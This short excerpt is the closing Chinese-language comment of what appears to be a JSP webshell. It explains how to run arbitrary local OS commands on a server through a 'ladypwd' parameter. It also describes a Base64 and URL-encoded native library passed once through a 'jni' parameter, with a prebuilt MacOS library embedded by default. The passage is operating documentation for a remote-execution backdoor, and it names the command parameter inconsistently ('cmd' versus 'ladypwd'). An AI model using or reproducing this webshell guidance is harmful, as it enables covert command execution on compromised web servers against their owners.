...
该webshell默认提供了一个MacOS的native库字符串,
其他系统的native需要自行编译:com_anbai_sec_cmd_CommandExecution.cpp

该webshell接收两个参数:cmd和jni，
参数描述：
1、ladypwd: 需要执行的本地命令
2、jni: 动态链接库文件Base64+URL编码后的字符串(urlEncode(base64Encode(jniFile))),
jni参数默认可以不传但是需要手动修改jsp中的COMMAND_JNI_FILE_BYTES变量，
jni参数只需要传一次，第二次请求不需要带上。
如果不传该参数，则使用自带的已编译好的MacOS的native库字符串。
--%>
